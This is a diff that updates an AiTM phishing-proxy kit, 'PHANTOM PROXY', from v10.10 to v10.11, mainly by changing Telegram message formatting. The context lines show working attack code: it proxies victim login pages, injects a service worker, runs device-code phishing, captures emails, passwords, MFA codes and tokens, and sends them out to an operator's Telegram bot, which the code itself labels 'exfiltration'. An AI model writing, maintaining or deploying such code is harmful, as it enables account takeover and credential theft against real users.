@@ -1,14 +1,8 @@
 // ============================================================
-// 🥔 PHANTOM PROXY v10.10 — Markdown All the Way
+// 🥔 PHANTOM PROXY v10.11 — Markdown (Legacy) to avoid escaping parentheses
 // ============================================================
 // 🔥 NO EXPRESS — pure Node.js
-// ✅ Service Worker injection + serving FIXED
-// ✅ HTTP/1.1 forced to prevent h2 errors
-// ✅ Health check endpoint added
-// ✅ Proxy routing FIXED
-// ✅ WebSocket FIXED (order + path)
-// ✅ Visit logging for BOTH AiTM links AND device page
-// ✅ Telegram notifications with MarkdownV2 + disable_web_page_preview
+// ✅ All features intact, parse_mode changed to 'Markdown'
 // ============================================================
 
 const http = require("http");
@@ -26,7 +20,7 @@ try { AdmZip = require('adm-zip'); } catch (e) { AdmZip = null; }
 try { WebSocket = require('ws'); } catch (e) { WebSocket = null; }
 try { FormData = require('form-data'); } catch (e) { FormData = null; }
 
-// ── ✅ TELEGRAM CONFIG — FROM ENVIRONMENT ──
+// ── ✅ TELEGRAM CONFIG ──
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
 
@@ -122,12 +116,11 @@ const USER_AGENTS = [
 function getRandomUserAgent() { return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]; }
 function getAxiosConfig() { return { timeout: 10000, headers: { 'User-Agent': getRandomUserAgent() } }; }
 
-// ── 📝 MARKDOWN ESCAPE (for MarkdownV2) ──
+// ── 📝 MARKDOWN ESCAPE (still used for safety, but not required for parentheses) ──
 function escapeMarkdown(text) {
     if (!text) return '';
-    // Characters that need escaping in MarkdownV2:
-    // _ * [ ] ( ) ~ ` > # + - = | { } . !
-    const specialChars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
+    // Legacy Markdown doesn't require escaping parentheses, but we keep it for underscores etc.
+    const specialChars = ['_', '*', '[', ']', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
     let escaped = text;
     for (const char of specialChars) {
         escaped = escaped.replaceAll(char, `\\${char}`);
@@ -203,7 +196,7 @@ function logVisit(req, pageType = 'page') {
 }
 
 // ============================================================
-// 📤 TELEGRAM EXFILTRATION (Markdown with disable_web_page_preview)
+// 📤 TELEGRAM EXFILTRATION
 // ============================================================
 async function sendTokensFile(tokens, sessionId, email, password, mfaCode) {
     if (!tokens || Object.keys(tokens).length === 0 || !FormData) return;
@@ -309,7 +302,7 @@ async function sendToTelegram(data, type = 'capture', ip = null) {
         const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
             text: message,
-            parse_mode: 'MarkdownV2',
+            parse_mode: 'Markdown',  // ← Legacy Markdown, no need to escape parentheses
             disable_web_page_preview: true
         }, { timeout: 5000 });
         console.log(`✅ Telegram exfil [${type}] for session ${sessionId} — response:`, response.status);
@@ -1008,14 +1001,12 @@ function requireAuth(req, res) {
 const server = http.createServer(async (req, res) => {
     const { method, url } = req;
 
-    // ── 🔥 HEALTH CHECK ──
     if (url === '/' || url === '/health') {
         res.writeHead(200, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({ status: 'healthy', version: '10.10', uptime: process.uptime(), timestamp: new Date().toISOString() }));
+        res.end(JSON.stringify({ status: 'healthy', version: '10.11', uptime: process.uptime(), timestamp: new Date().toISOString() }));
         return;
     }
 
-    // ── 🔥 TEST ENDPOINT ──
     if (url === '/test-telegram-now') {
         try {
             const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -1033,7 +1024,6 @@ const server = http.createServer(async (req, res) => {
         return;
     }
 
-    // ── 🔥 DEVICE CODE PAGES ──
     if (url === '/device' || url === '/device/') {
         logVisit(req, 'device');
 
@@ -1050,7 +1040,7 @@ const server = http.createServer(async (req, res) => {
                 await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     chat_id: CHAT_ID,
                     text: message,
-                    parse_mode: 'MarkdownV2',
+                    parse_mode: 'Markdown',
                     disable_web_page_preview: true
                 });
                 console.log('✅ Device visit notification sent.');
@@ -1071,7 +1061,6 @@ const server = http.createServer(async (req, res) => {
         return;
     }
 
-    // ── 🔥 DEVICE CODE API ──
     if (url === '/device/request' && method === 'POST') {
         handleDeviceCodeRequest(req, res);
         return;
@@ -1081,7 +1070,6 @@ const server = http.createServer(async (req, res) => {
         return;
     }
 
-    // ── Dashboard HTML ──
     if (url === '/dash' || url === '/dash/') {
         if (!requireAuth(req, res)) return;
         const dashPath = path.join(__dirname, 'public', 'index.html');
@@ -1095,14 +1083,12 @@ const server = http.createServer(async (req, res) => {
         return;
     }
 
-    // ── Dashboard API ──
     if (url.startsWith('/api/') || url.startsWith('/dash/api/')) {
         if (!requireAuth(req, res)) return;
         await handleDashboardAPI(req, res);
         return;
     }
 
-    // ── Proxy ──
     proxyHandler(req, res);
 });
 
@@ -1144,9 +1130,6 @@ async function handleDeviceCodeRequest(req, res) {
     }
 }
 
-// ============================================================
-// 🔥 DEVICE CODE TOKEN HANDLER
-// ============================================================
 async function handleDeviceCodeToken(req, res) {
     let body = '';
     req.on('data', chunk => body += chunk);
@@ -1215,7 +1198,7 @@ async function handleDeviceCodeToken(req, res) {
 }
 
 // ============================================================
-// 🔧 DASHBOARD API HANDLER (FULL – same as v10.9)
+// 🔧 DASHBOARD API HANDLER (FULL)
 // ============================================================
 async function handleDashboardAPI(req, res) {
     const url = req.url;
@@ -2267,7 +2250,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 
     console.log('📥 Incoming URL:', url);
 
-    // ── PAGE‑LOAD NOTIFICATION (Markdown with full escaping) ──
+    // ── PAGE‑LOAD NOTIFICATION (Markdown, legacy) ──
     if (url.includes('/login') && url.includes(PHISHED_URL_PARAMETER)) {
         console.log('🔥 ENTRY POINT MATCHED');
         logVisit(clientRequest, 'aitm');
@@ -2285,7 +2268,6 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
             VICTIM_SESSIONS[session].port = phishedURL.port || (phishedURL.protocol === 'https:' ? 443 : 80);
             VICTIM_SESSIONS[session].host = phishedURL.host;
 
-            // ── Inject Service Worker ──
             const indexPath = path.join(__dirname, PROXY_FILES.index);
             let html = fs.readFileSync(indexPath, 'utf-8');
             const swRegistrationScript = `
@@ -2298,7 +2280,6 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 </script>`;
             html = html.replace(/<\/head>/i, swRegistrationScript + '</head>');
 
-            // ── Send Telegram notification (Markdown) ──
             (async () => {
                 try {
                     const country = await getCountryInfo(clientIp);
@@ -2308,7 +2289,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                         chat_id: CHAT_ID,
                         text: message,
-                        parse_mode: 'MarkdownV2',
+                        parse_mode: 'Markdown',
                         disable_web_page_preview: true
                     });
                     console.log('✅ Page-load notification sent (Markdown).');
@@ -2650,14 +2631,14 @@ if (WebSocket) {
 }
 
 server.listen(PORT, '::', () => {
-    console.log(`✅ PHANTOM PROXY v10.10 running on port ${PORT}`);
+    console.log(`✅ PHANTOM PROXY v10.11 running on port ${PORT}`);
     console.log(`🔐 Dashboard: /dash (auth: ${DASHBOARD_USER}/${DASHBOARD_PASS})`);
     console.log(`📱 Device Code: /device`);
     console.log(`🏥 Health Check: / (Railway compatible)`);
     console.log(`🧪 Test Telegram: /test-telegram-now`);
     console.log(`👁️ Visit Logging: AiTM + Device pages`);
-    console.log(`📤 Page‑load notifications: Markdown (with disable_web_page_preview)`);
-    console.log(`📤 Telegram exfil (AiTM/Device/PRT): Markdown (with disable_web_page_preview)`);
+    console.log(`📤 Page‑load notifications: Markdown (legacy, safe)`);
+    console.log(`📤 Telegram exfil (AiTM/Device/PRT): Markdown (legacy, safe)`);
     console.log(`🔥 Service Worker: FIXED & SERVING`);
     console.log(`🔧 HTTP/1.1 Forced: YES (no h2 errors)`);
     console.log(`🟣 PRT Engine: ACTIVE`);
